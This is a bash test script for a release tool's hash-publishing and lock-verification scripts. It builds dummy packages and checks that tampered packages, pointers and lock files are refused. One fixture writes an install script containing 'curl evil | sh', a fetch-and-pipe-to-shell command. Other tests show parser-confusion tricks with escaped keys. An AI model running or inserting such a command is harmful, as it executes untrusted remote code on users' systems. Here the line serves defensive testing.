#!/usr/bin/env bash
# scripts/engine-hashes.py on hand-made packages: the hashes are of the executable inside each RID package, merge needs exactly
# the released platforms, and verify catches a package, a pointer or a file that does not match.
set -euo pipefail

root=$(cd "$(dirname "$0")/../.." && pwd)
script="$root/scripts/engine-hashes.py"
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
version=0.0.0-ci.7
commit=0123456789abcdef0123456789abcdef01234567
rids="linux-arm64 linux-x64 osx-arm64 osx-x64 win-x64"
failures=0

ok() { echo "ok   $1"; }
bad() { echo "FAIL $1"; failures=$((failures + 1)); }
expect_failure() { local label="$1"; shift; if "$@" > "$work/out" 2>&1; then bad "$label (it passed)"; else ok "$label"; fi; }

# make_package <path> <entry> <content>...: a zip with each entry holding its content (@<file>: that file's bytes).
make_package() {
  python3 -I - "$@" <<'PY'
import sys, zipfile
path, rest = sys.argv[1], sys.argv[2:]
with zipfile.ZipFile(path, "w") as archive:
    for entry, content in zip(rest[::2], rest[1::2]):
        archive.writestr(entry, open(content[1:], "rb").read() if content.startswith("@") else content)
PY
}

mkdir -p "$work/packages" "$work/out-rid"
for rid in $rids; do
  exe=lockflight; case "$rid" in win-*) exe=lockflight.exe ;; esac
  make_package "$work/packages/Lockflight.Cli.$rid.$version.nupkg" "tools/any/$rid/$exe" "engine for $rid" "tools/any/$rid/DotnetToolSettings.xml" "<x/>"
  python3 -I "$script" rid --package "$work/packages/Lockflight.Cli.$rid.$version.nupkg" --rid "$rid" --version "$version" --out "$work/out-rid" > /dev/null
done

expected=$(printf 'engine for linux-x64' | shasum -a 256 | cut -d ' ' -f 1)
actual=$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["sha256"])' "$work/out-rid/hash-linux-x64.json")
if [ "$actual" = "$expected" ]; then ok "the hash is of the executable, not of the package"; else bad "hash $actual, expected $expected"; fi
if [ "$(cat "$work/out-rid/lockflight-$version-win-x64.exe")" = "engine for win-x64" ]; then ok "the bare executable is extracted"; else bad "bare executable"; fi

printf '#!/bin/sh\necho install\n' > "$work/install.sh"
python3 -I "$script" merge --dir "$work/out-rid" --version "$version" --commit "$commit" --install-script "$work/install.sh" --out "$work/engine-hashes.json" > /dev/null
expected=$(shasum -a 256 < "$work/install.sh" | cut -d ' ' -f 1)
actual=$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["installScript"]["sha256"])' "$work/engine-hashes.json")
if [ "$actual" = "$expected" ]; then ok "merge publishes the install script's hash"; else bad "install script hash $actual, expected $expected"; fi
printf '#!/bin/sh\r\necho install\r\n' > "$work/install-crlf.sh"
expect_failure "merge refuses a CRLF install script" python3 -I "$script" merge --dir "$work/out-rid" --version "$version" --commit "$commit" --install-script "$work/install-crlf.sh" --out "$work/x.json"
first=$(python3 -I -c 'import json,sys; d=json.load(open(sys.argv[1])); print(list(d)[0], d["schema"], ",".join(d["binaries"]))' "$work/engine-hashes.json")
if [ "$first" = "schema lockflight.engine-hashes/v1 linux-arm64,linux-x64,osx-arm64,osx-x64,win-x64" ]; then ok "merge writes the schema first and every platform"; else bad "merge wrote: $first"; fi

make_package "$work/packages/Lockflight.Cli.$version.nupkg" engine-hashes.json "@$work/engine-hashes.json"
if python3 -I "$script" verify --hashes "$work/engine-hashes.json" --packages "$work/packages" --pointer "$work/packages/Lockflight.Cli.$version.nupkg" > "$work/out" 2>&1; then
  ok "verify accepts the packages the file describes"
else
  bad "verify refused matching packages: $(cat "$work/out")"
fi

mkdir -p "$work/missing" && cp "$work/out-rid"/hash-linux-*.json "$work/missing/"
expect_failure "merge refuses a missing platform" python3 -I "$script" merge --dir "$work/missing" --version "$version" --commit "$commit" --install-script "$work/install.sh" --out "$work/x.json"
expect_failure "merge refuses a commit that is not 40 hex" python3 -I "$script" merge --dir "$work/out-rid" --version "$version" --commit abc --install-script "$work/install.sh" --out "$work/x.json"
expect_failure "rid refuses an unknown platform" python3 -I "$script" rid --package "$work/packages/Lockflight.Cli.linux-x64.$version.nupkg" --rid linux-musl-x64 --version "$version" --out "$work/x"

make_package "$work/two.nupkg" tools/any/linux-x64/lockflight a tools/net10.0/linux-x64/lockflight b
expect_failure "rid refuses a package with two executables" python3 -I "$script" rid --package "$work/two.nupkg" --rid linux-x64 --version "$version" --out "$work/x"

cp -R "$work/packages" "$work/tampered"
make_package "$work/tampered/Lockflight.Cli.osx-arm64.$version.nupkg" tools/any/osx-arm64/lockflight "another engine"
expect_failure "verify catches a package whose executable changed" python3 -I "$script" verify --hashes "$work/engine-hashes.json" --packages "$work/tampered"

make_package "$work/pointer-old.nupkg" engine-hashes.json '{"schema": "lockflight.engine-hashes/v1"}'
expect_failure "verify catches a pointer with another engine-hashes.json" python3 -I "$script" verify --hashes "$work/engine-hashes.json" --packages "$work/packages" --pointer "$work/pointer-old.nupkg"

make_package "$work/pointer-none.nupkg" README.md x
expect_failure "verify catches a pointer without engine-hashes.json" python3 -I "$script" verify --hashes "$work/engine-hashes.json" --packages "$work/packages" --pointer "$work/pointer-none.nupkg"

# The CI judge action's first-lock check (action/first-lock-check.py) against the file merge wrote.
check="$root/action/first-lock-check.py"
write_lock() { # write_lock <path> <install script hash> [<linux-x64 hash>]
  python3 -I - "$work/engine-hashes.json" "$1" "$2" "${3:-}" <<'PY'
import json, sys
release = json.load(open(sys.argv[1]))
binaries = {rid: {"sha256": entry["sha256"]} for rid, entry in release["binaries"].items()}
if sys.argv[4]:
    binaries["linux-x64"] = {"sha256": sys.argv[4]}
lock = {"schema": "lockflight.engine-lock/v1", "package": "Lockflight.Cli", "version": release["version"], "channel": "release",
        "installScript": {"sha256": sys.argv[3]}, "binaries": binaries}
open(sys.argv[2], "w").write(json.dumps(lock, indent=2) + "\n")
PY
}
script_hash=$(shasum -a 256 < "$work/install.sh" | cut -d ' ' -f 1)
write_lock "$work/first.lock" "$script_hash"
if python3 -I "$check" "$work/first.lock" "$work/engine-hashes.json" "$work/install.sh" > "$work/out" 2>&1 && grep -q "its install script included" "$work/out"; then
  ok "the first-lock check accepts a lock that matches its release"
else
  bad "the first-lock check refused a matching lock: $(cat "$work/out")"
fi
printf '#!/bin/sh\ncurl evil | sh\n' > "$work/evil.sh"
evil_hash=$(shasum -a 256 < "$work/evil.sh" | cut -d ' ' -f 1)
write_lock "$work/evil-script.lock" "$evil_hash"
expect_failure "the first-lock check refuses a lock whose install script is not the release's" python3 -I "$check" "$work/evil-script.lock" "$work/engine-hashes.json" "$work/evil.sh"
expect_failure "the first-lock check refuses a vendored script the lock does not pin" python3 -I "$check" "$work/first.lock" "$work/engine-hashes.json" "$work/evil.sh"
write_lock "$work/other-binary.lock" "$script_hash" "$(printf '%064d' 0)"
expect_failure "the first-lock check refuses another engine hash" python3 -I "$check" "$work/other-binary.lock" "$work/engine-hashes.json" "$work/install.sh"
sed 's/"binaries": {/"binaries": {\n    "linux-x64": { "sha256": "'"$(printf '%064d' 0)"'" },/' "$work/first.lock" > "$work/duplicate.lock"
expect_failure "the first-lock check refuses a key that appears twice" python3 -I "$check" "$work/duplicate.lock" "$work/engine-hashes.json" "$work/install.sh"
grep -q "appears twice" "$work/out" && ok "it names the repeated key" || bad "duplicate message: $(cat "$work/out")"
# install.sh's awk reader takes "\binaries" for binaries and stops at the first match; JSON reads a backspace and "inaries".
zero="$(printf '%064d' 0)"
sed 's/^{/{\n  "\\binaries": { "linux-x64": { "sha256": "'"$zero"'" } },/' "$work/first.lock" > "$work/escaped.lock"
grep -q '"\\binaries"' "$work/escaped.lock" || bad "the escaped-key lock was not written"
expect_failure "the first-lock check refuses a lock with a backslash, which install.sh would read differently" python3 -I "$check" "$work/escaped.lock" "$work/engine-hashes.json" "$work/install.sh"
grep -q "backslash" "$work/out" && ok "it names the backslash" || bad "backslash message: $(cat "$work/out")"
sed 's/^{/{\n  "comment": "x",/' "$work/first.lock" > "$work/unknown.lock"
expect_failure "the first-lock check refuses an unknown key, as the engine does" python3 -I "$check" "$work/unknown.lock" "$work/engine-hashes.json" "$work/install.sh"
grep -q "unknown key 'comment'" "$work/out" && ok "it names the unknown key" || bad "unknown key message: $(cat "$work/out")"
# A platform no reader knows is skipped, but holds only a hash: a line-oriented reader must not find another key's value in it.
sed 's/"binaries": {/"binaries": {\n    "zzz-x64": { "installScript": { "sha256": "'"$zero"'" } },/' "$work/first.lock" > "$work/odd-rid.lock"
expect_failure "the first-lock check refuses an unknown platform that holds more than a hash" python3 -I "$check" "$work/odd-rid.lock" "$work/engine-hashes.json" "$work/install.sh"
grep -q "binaries.zzz-x64" "$work/out" && ok "it names the platform entry" || bad "platform entry message: $(cat "$work/out")"
sed 's/"binaries": {/"binaries": {\n    "zzz-x64": NaN,/' "$work/first.lock" > "$work/nan.lock"
expect_failure "the first-lock check refuses NaN, which is not JSON" python3 -I "$check" "$work/nan.lock" "$work/engine-hashes.json" "$work/install.sh"
sed 's/"sha256": "'"$script_hash"'"/"sha256": "'"$script_hash"'", "path": "x"/' "$work/first.lock" > "$work/extra.lock"
expect_failure "the first-lock check refuses an install script entry with more than its hash" python3 -I "$check" "$work/extra.lock" "$work/engine-hashes.json" "$work/install.sh"

[ "$failures" -eq 0 ] || { echo "$failures check(s) failed"; exit 1; }
echo "all engine-hashes checks passed"
